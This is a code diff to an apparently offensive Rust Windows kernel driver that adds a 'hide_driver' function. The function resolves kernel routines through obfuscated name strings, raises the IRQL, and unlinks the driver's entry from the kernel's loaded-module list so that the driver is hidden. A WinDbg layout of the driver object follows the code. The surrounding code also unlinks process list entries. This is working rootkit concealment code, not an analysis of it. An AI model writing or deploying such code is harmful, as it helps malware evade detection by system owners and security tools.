@@ -1,7 +1,6 @@
-use core::{mem::size_of, ptr::addr_of_mut};
-
-use winapi::{shared::ntdef::{LIST_ENTRY, UNICODE_STRING}, km::wdm::PEPROCESS};
-
+use core::{mem::size_of, ptr::{addr_of_mut}, intrinsics::transmute};
+use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
+use winapi::{shared::{ntdef::{LIST_ENTRY, UNICODE_STRING}}, km::wdm::{PEPROCESS, DEVICE_OBJECT, KIRQL}};
 use crate::{includes::{PsGetCurrentProcess}, process::get_function_base_address, string::create_unicode_string};
 
 
@@ -101,3 +100,90 @@ fn remove_links(current: *mut LIST_ENTRY) {
     unsafe { (*current).Blink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
     unsafe { (*current).Flink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
 }
+
+type FnKeRaiseIrqlToDpcLevel = unsafe extern "system" fn() -> KIRQL;
+type FnKeLowerIrql = unsafe extern "system" fn(new_irql: KIRQL);
+
+pub fn hide_driver(device_object: &mut DEVICE_OBJECT) -> Result<bool, &'static str> {
+
+    //KeRaiseIrqlToDpcLevel
+    let unicode_function_name = &mut create_unicode_string(
+        obfstr::wide!("KeRaiseIrqlToDpcLevel\0")
+    ) as *mut UNICODE_STRING;
+    
+    let ptr_ke_raise_irql_to_dpc_level = get_function_base_address(unicode_function_name);
+
+    if ptr_ke_raise_irql_to_dpc_level.is_null() {
+        log::error!("KeRaiseIrqlToDpcLevel is null");
+        return Err("KeRaiseIrqlToDpcLevel is null");
+    }
+
+    //KeLowerIrql
+    let unicode_function_name = &mut create_unicode_string(
+        obfstr::wide!("KeLowerIrql\0")
+    ) as *mut UNICODE_STRING;
+    
+    let ptr_ke_lower_irql = get_function_base_address(unicode_function_name);
+
+    if ptr_ke_lower_irql.is_null() {
+        log::error!("KeLowerIrql is null");
+        return Err("KeLowerIrql is null");
+    }
+
+    //Convert to function pointers
+    #[allow(non_snake_case)]
+    let KeRaiseIrqlToDpcLevel = unsafe { transmute::<_, FnKeRaiseIrqlToDpcLevel>(ptr_ke_raise_irql_to_dpc_level) };
+    #[allow(non_snake_case)]
+    let KeLowerIrql = unsafe { transmute::<_, FnKeLowerIrql>(ptr_ke_lower_irql) };
+
+
+    //The KeRaiseIrqlToDpcLevel routine raises the hardware priority to IRQL = DISPATCH_LEVEL, thereby masking off interrupts of equivalent or lower IRQL on the current processor.
+    let irql = unsafe { KeRaiseIrqlToDpcLevel() };
+    log::info!("KeRaiseIrqlToDpcLevel: IRQL is {:?}", irql);
+
+    if device_object.DriverObject.is_null() {
+        log::info!("DriverObject is null");
+        return Err("DriverObject is null");
+    }
+
+    let module_entry = unsafe { (*device_object.DriverObject).DriverSection as *mut LDR_DATA_TABLE_ENTRY };
+
+
+    let previous_entry =  unsafe { (*module_entry).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY };
+    let next_entry = unsafe { (*module_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY };
+
+
+    unsafe { (*previous_entry).InLoadOrderLinks.Flink = (*module_entry).InLoadOrderLinks.Flink };
+    unsafe { (*next_entry).InLoadOrderLinks.Blink = (*module_entry).InLoadOrderLinks.Blink };
+
+    unsafe { (*module_entry).InLoadOrderLinks.Flink = module_entry as *mut ntapi::winapi::shared::ntdef::LIST_ENTRY };
+    unsafe { (*module_entry).InLoadOrderLinks.Blink = module_entry as *mut ntapi::winapi::shared::ntdef::LIST_ENTRY };
+
+
+    //The KeLowerIrql routine restores the IRQL on the current processor to its original value. For information about IRQLs, see Managing Hardware Priorities.
+    unsafe { KeLowerIrql(irql) };
+    log::info!("KeLowerIrql: IRQL is {:?}", irql);
+
+    return Ok(true);
+}
+
+
+/*
+0: kd> dt _DRIVER_OBJECT
+nt!_DRIVER_OBJECT
+   +0x000 Type             : Int2B
+   +0x002 Size             : Int2B
+   +0x008 DeviceObject     : Ptr64 _DEVICE_OBJECT
+   +0x010 Flags            : Uint4B
+   +0x018 DriverStart      : Ptr64 Void
+   +0x020 DriverSize       : Uint4B
+   +0x028 DriverSection    : Ptr64 Void
+   +0x030 DriverExtension  : Ptr64 _DRIVER_EXTENSION
+   +0x038 DriverName       : _UNICODE_STRING
+   +0x048 HardwareDatabase : Ptr64 _UNICODE_STRING
+   +0x050 FastIoDispatch   : Ptr64 _FAST_IO_DISPATCH
+   +0x058 DriverInit       : Ptr64     long 
+   +0x060 DriverStartIo    : Ptr64     void 
+   +0x068 DriverUnload     : Ptr64     void 
+   +0x070 MajorFunction    : [28] Ptr64     long 
+*/
